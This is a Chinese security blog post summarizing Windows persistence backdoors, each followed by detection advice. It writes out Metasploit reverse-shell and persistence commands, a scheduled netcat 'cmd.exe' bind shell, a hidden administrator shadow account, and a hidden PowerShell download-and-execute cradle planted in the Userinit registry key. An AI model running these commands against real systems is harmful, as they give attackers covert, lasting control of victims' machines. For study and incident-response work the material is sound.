@@ -1,0 +1,1591 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="应急响应,权限维持,后门,windows,挖矿," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="瓦都剋" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="上一篇文章中学习了下linux下的一些权限维持常用的技术手段，Linux、Windows权限维持常用后门学习总结之Linux，接着学习下Windows下的常用技术手段。">
+<meta name="keywords" content="应急响应,权限维持,后门,windows,挖矿">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux、Windows权限维持常用后门学习总结:windows篇">
+<meta property="og:url" content="http://byd.dropsec.xyz/2019/03/27/Linux、Windows权限维持常用后门总结2/index.html">
+<meta property="og:site_name" content="瓦都剋">
+<meta property="og:description" content="上一篇文章中学习了下linux下的一些权限维持常用的技术手段，Linux、Windows权限维持常用后门学习总结之Linux，接着学习下Windows下的常用技术手段。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-03-28T11:04:07.068Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux、Windows权限维持常用后门学习总结:windows篇">
+<meta name="twitter:description" content="上一篇文章中学习了下linux下的一些权限维持常用的技术手段，Linux、Windows权限维持常用后门学习总结之Linux，接着学习下Windows下的常用技术手段。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键词进行搜索","hits_empty":"找不到关于“${query}”的文章","hits_stats":"共找到 ${hits} 篇文化在那个，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://byd.dropsec.xyz/2019/03/27/Linux、Windows权限维持常用后门总结2/"/>
+
+
+
+
+
+  <title>Linux、Windows权限维持常用后门学习总结:windows篇 | 瓦都剋</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?61c879c1c104a92aab1d6e4b6888ffe5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">瓦都剋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Looking at yourself from a different Angle!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/daima" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wrench"></i> <br />
+            
+            工具
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-daohang">
+          <a href="/daohang" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://byd.dropsec.xyz/2019/03/27/Linux、Windows权限维持常用后门总结2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="瓦都剋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="瓦都剋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux、Windows权限维持常用后门学习总结:windows篇</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-27T10:13:31+08:00">
+                2019-03-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/03/27/Linux、Windows权限维持常用后门总结2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/03/27/Linux、Windows权限维持常用后门总结2/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  7,829
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  35
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>上一篇文章中学习了下linux下的一些权限维持常用的技术手段，<a href="https://www.secpulse.com/archives/100484.html" target="_blank" rel="external">Linux、Windows权限维持常用后门学习总结之Linux</a>，接着学习下Windows下的常用技术手段。</p>
+<a id="more"></a>
+<h3 id="MSF模块"><a href="#MSF模块" class="headerlink" title="MSF模块"></a>MSF模块</h3><p>Metasploit自带有权限维持相关后门，常用的有：通过服务启动(metsvc)；通过启动项启动(persistence)；通过计划任务(scheduleme&amp;schtasksabuse)。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1、生成payload</div><div class="line">msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.2.11 LPORT=23333 X &gt;xx.exe</div><div class="line">2、监听</div><div class="line"><span class="meta">msf&gt;</span><span class="bash"> use exploit/multi/handler</span></div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.2.11</div><div class="line">set LPORT 23333</div><div class="line">exploit</div><div class="line">3、运行payload就会获取到一个meterpreter shell</div></pre></td></tr></table></figure>
+<h4 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">metsvc是通过服务启动，服务名是meterpreter。</div><div class="line"></div><div class="line">启动：</div><div class="line"><span class="meta">meterpreter&gt;</span><span class="bash"> run metsvc -A</span></div><div class="line">移除：</div><div class="line"><span class="meta">meterpreter&gt;</span><span class="bash"> run metsvc -r</span></div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Autoruns</div><div class="line"><span class="built_in">Process</span> Explorer</div><div class="line">TCPView</div></pre></td></tr></table></figure>
+<h4 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">persistence是通过启动项启动</div><div class="line"></div><div class="line"><span class="meta">meterpreter&gt;</span><span class="bash"> run persistence –X –i 50 –p 23333 –r 192.168.2.11（YOUR MSF IP）</span></div><div class="line">参数解析：</div><div class="line">-X 开机启动，注册表位置：HKLM\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="line">-U 当用户登录时自启动，注册表位置：HKCU\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="line">-S 作为服务启动，注册表位置：HKLM\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="line">-L 后门传到远程主机的位置默认为%TEMP%</div><div class="line">-P 使用的Payload，默认windows/meterpreter/reverse_tcp，该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行</div><div class="line">-i 连接超时时间 –p 端口 –r remoteIP</div><div class="line"></div><div class="line">当使用run persistence进行持久化时默认远程路径会推送到%TEMP%("C:\Users\AppData\Local\Temp\")。当用户重启或者temp目录下存在数字id，persistence持久化就会出错。</div><div class="line"><span class="meta">meterpreter&gt;</span><span class="bash"> run persistence -S -i 5 -p 23333 -r 192.168.2.11 -L c:\\Windows\\System32</span></div><div class="line">该命令脚本注册自启动注册表位置：</div><div class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</div><div class="line"></div><div class="line">可以使用如下命令查看注册表的Key：</div><div class="line"><span class="meta">meterpreter&gt;</span><span class="bash"> reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span></div><div class="line">查询Values</div><div class="line"><span class="meta">meterpreter&gt;</span><span class="bash"> reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v UxMvAJkbedJu</span></div><div class="line">除Values</div><div class="line"><span class="meta">meterpreter&gt;</span><span class="bash"> reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v MDxTmrUjRGnvIaT</span></div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">检查注册表相关键值</div><div class="line">Autoruns</div><div class="line"><span class="built_in">Process</span> Monitor</div></pre></td></tr></table></figure>
+<h4 id="Scheduleme-amp-Schtasksabuse"><a href="#Scheduleme-amp-Schtasksabuse" class="headerlink" title="Scheduleme&amp;Schtasksabuse"></a>Scheduleme&amp;Schtasksabuse</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">scheduleme和schtasksabuse是通过利用计划任务启动</div><div class="line"></div><div class="line"><span class="meta">meterpreter&gt;</span><span class="bash"> run scheduleme -m 1 -e /tmp/nc.exe -o <span class="string">"-e cmd.exe -L -p 8080"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> 上传nc并创建计划任务每一分钟执行一次<span class="string">'nc -e cmd.exe -L -p 8080'</span></span></div><div class="line"></div><div class="line"><span class="meta">meterpreter&gt;</span><span class="bash"> run schtasksabuse -t 192.168.2.7 -c <span class="string">"cmd /c calc.exe"</span> -d 30</span></div><div class="line"><span class="meta">#</span><span class="bash"> 每隔30秒执行一次calc.exe</span></div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Autoruns</span></div></pre></td></tr></table></figure>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">图形化工具：taskschd.msc</div><div class="line">命令行工具：schtasks.exe</div><div class="line">SCHTASKS /parameter [arguments]</div><div class="line">/Create         创建新计划任务</div><div class="line">/Delete         删除计划任务</div><div class="line">/Query          显示所有计划任务</div><div class="line">/Run            运行计划任务</div><div class="line">/End            中止当前正在运行的计划任务</div><div class="line">Payload examples:</div><div class="line"><span class="meta">&gt;</span><span class="bash"> SCHTASKS /Create /TN update /TR xx(待执行的命令)  /DELAY ONLOGON /F /RL HIGHEST</span></div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Autoruns</span></div></pre></td></tr></table></figure>
+<h3 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a>影子账户</h3><p>影子账户是指除了在注册表里面有用户记录，其他地方都不存在用户的信息。<code>net user</code>或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">1、用'$'创建匿名用户，并加到administrator组</div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> net user admin$ 123456 /add</span></div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> net localgroup administrators admin$ /add</span></div><div class="line">2、导出匿名用户对应的sam目录下的注册表键值</div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> regedt32.exe</span></div><div class="line">打开HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users键值，然后找到admin$对应的类型以及文件夹，以及administrator对应的文件夹，将administrator文件夹中的F值内容复制到admin$对应文件夹F值中。</div><div class="line">PS：注意Sam键值在属性中给予administrator完全控制以及读取的权限，默认是不允许的</div><div class="line">3、删除匿名用户</div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> net user admin$ /del</span></div><div class="line">4、还原匿名用户</div><div class="line">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\admin$</div><div class="line">双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改，就可以重新还原之前的匿名用户</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1、删除注册表HKEY_LOCAL_MACHINE<span class="symbol">\S</span>AM<span class="symbol">\S</span>AM<span class="symbol">\D</span>omains<span class="symbol">\A</span>ccount<span class="symbol">\U</span>sers<span class="symbol">\下</span>对应帐户的键值</div><div class="line">2、隐藏帐户的登录记录，可通过查看日志获取</div><div class="line">注：工具HideAdmin能自动实现以上的创建和删除操作</div></pre></td></tr></table></figure>
+<h3 id="PowerShell后门"><a href="#PowerShell后门" class="headerlink" title="PowerShell后门"></a>PowerShell后门</h3><h4 id="Empire框架"><a href="#Empire框架" class="headerlink" title="Empire框架"></a>Empire框架</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/EmpireProject/</span>Empire</div></pre></td></tr></table></figure>
+<h4 id="Schtasks-Backdoor"><a href="#Schtasks-Backdoor" class="headerlink" title="Schtasks-Backdoor"></a>Schtasks-Backdoor</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/re4lity/</span>Schtasks-Backdoor</div></pre></td></tr></table></figure>
+<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">msf&gt; use exploit/multi/script/web_delivery</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set LHOST <span class="number">192.168</span>.<span class="number">2.11</span></div><div class="line">set target <span class="number">2</span></div><div class="line">run</div><div class="line">PAYLOAD:</div><div class="line">powershell.exe -nop -w hidden -c <span class="variable">$w</span>=<span class="built_in">new-object</span> net.webclient;<span class="variable">$w</span>.proxy=[Net.WebRequest]::GetSystemWebProxy();<span class="variable">$w</span>.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX <span class="variable">$w</span>.downloadstring(<span class="string">'http://192.168.2.11:8080/kaMhC1'</span>);</div></pre></td></tr></table></figure>
+<h4 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://wooyun.js.org/drops/Powershell%E4%B9%8BMOF%E5%90%8E%E9%97%A8.html</div></pre></td></tr></table></figure>
+<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><p>注册表可以理解为一个树状结构的数据库，它具有一些特殊的数据类型用来存储一些数据满足应用程序的需要。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">名称</th>
+<th style="text-align:center">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">HKEY_CLASSES_ROOT</td>
+<td style="text-align:center">用于存储一些文档类型、类、类的关联属性</td>
+</tr>
+<tr>
+<td style="text-align:center">HKEY_CURRENT_CONFIG</td>
+<td style="text-align:center">用户存储有关本地计算机系统的当前硬件配置文件信息</td>
+</tr>
+<tr>
+<td style="text-align:center">HKEY_CURRENT_USER</td>
+<td style="text-align:center">用于存储当前用户配置项</td>
+</tr>
+<tr>
+<td style="text-align:center">HKEY_CURRENT_USER_LOCAL_SETTINGS</td>
+<td style="text-align:center">用于存储当前用户对计算机的配置项</td>
+</tr>
+<tr>
+<td style="text-align:center">HKEY_LOCAL_MACHINE</td>
+<td style="text-align:center">用于存储当前用户物理状态</td>
+</tr>
+<tr>
+<td style="text-align:center">HKEY_USERS</td>
+<td style="text-align:center">用于存储新用户的默认配置项</td>
+</tr>
+</tbody>
+</table>
+<h4 id="Run-RunOnce-Keys"><a href="#Run-RunOnce-Keys" class="headerlink" title="Run/RunOnce Keys"></a>Run/RunOnce Keys</h4><p>Run键值代表着开机启动项，也就是说在这个项下的键值会随着开机启动（这里的开机是指用户登录，也就是说只要有登录操作就会执行）。</p>
+<p>RunOnce键值类似于 Run 键值，唯一的区别在于，RunOnce 键值只执行一次，操作执行后会被自动删除。</p>
+<p><strong>用户级</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</div><div class="line">HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</div></pre></td></tr></table></figure>
+<p><strong>管理员</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>un</div><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\R</span>unOnce</div><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\P</span>olicies<span class="symbol">\E</span>xplorer<span class="symbol">\R</span>un</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">检测注册表相关键值</div><div class="line">Autoruns</div></pre></td></tr></table></figure>
+<h4 id="BootExecute-Key"><a href="#BootExecute-Key" class="headerlink" title="BootExecute Key"></a>BootExecute Key</h4><p>可以通过它来实现启动Natvice程序，Native程序在驱动程序和系统核心加载后将被加载，此时会话管理器(smss.exe)进行windowsNT用户模式并开始按顺序启动native程序。由于<code>smss.exe</code>在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元。具体注册表键值为：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\h</span>ivelist</div><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>ontrolSet002<span class="symbol">\C</span>ontrol<span class="symbol">\S</span>ession Manager</div></pre></td></tr></table></figure>
+<p>上述注册表下有一个名为BootExecute的多字符串值键，它的默认值是<code>autocheck autochk *</code>，用于系统启动时的某些自动检查。这个启动项目里的程序是在系统图形界面完成前就被执行的，所以具有很高的优先级。</p>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">检查注册表相关键值：</div><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\h</span>ivelist</div><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>ontrolSet002<span class="symbol">\C</span>ontrol<span class="symbol">\S</span>ession Manager</div></pre></td></tr></table></figure>
+<h4 id="Userinit-Key"><a href="#Userinit-Key" class="headerlink" title="Userinit Key"></a>Userinit Key</h4><p>Userinit注册表键的作用是在用户进行登陆时，WinLogon进程加载的指定的login scripts，可以更改它的值来添加与删除程序。具体键值：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon</div></pre></td></tr></table></figure>
+<p>一般情况下，其默认值为<code>userinit.exe</code>，由于该子键的值中可使用逗号分隔开多个程序，因此，在键值的数值中可加入其它程序。</p>
+<p>结合上面powershell中的msf方法，可以达到无文件后门效果：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Powershell实现：</div><div class="line">Set-ItemProperty "HKLM:<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>INDOWS NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon" -name Userinit -value "C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\u</span>serinit.exe,powershell.exe -nop -w hidden -c <span class="keyword">$w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy</span>();<span class="keyword">$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.downloadstring</span>('http://192.168.2.11:8080/kaMhC1');"</div><div class="line"></div><div class="line"># powershell反弹shell的payload参照上面msf中的web_delivery模块</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">查看HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inlogon<span class="symbol">\U</span>serinit</div></pre></td></tr></table></figure>
+<h4 id="LogonScripts-key"><a href="#LogonScripts-key" class="headerlink" title="LogonScripts key"></a>LogonScripts key</h4><p>Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截，具体键值：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">HKEY_CURRENT_USER</span>\<span class="selector-tag">Environment</span>\</div><div class="line">创建字符串键值: <span class="selector-tag">UserInitMprLogonScript</span></div><div class="line">键值设置为<span class="selector-tag">bat</span>的绝对路径<span class="selector-pseudo">:c</span>:\1<span class="selector-class">.bat</span></div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">查看HKEY_CURRENT_USER<span class="symbol">\E</span>nvironment<span class="symbol">\U</span>serInitMprLogonScript</div></pre></td></tr></table></figure>
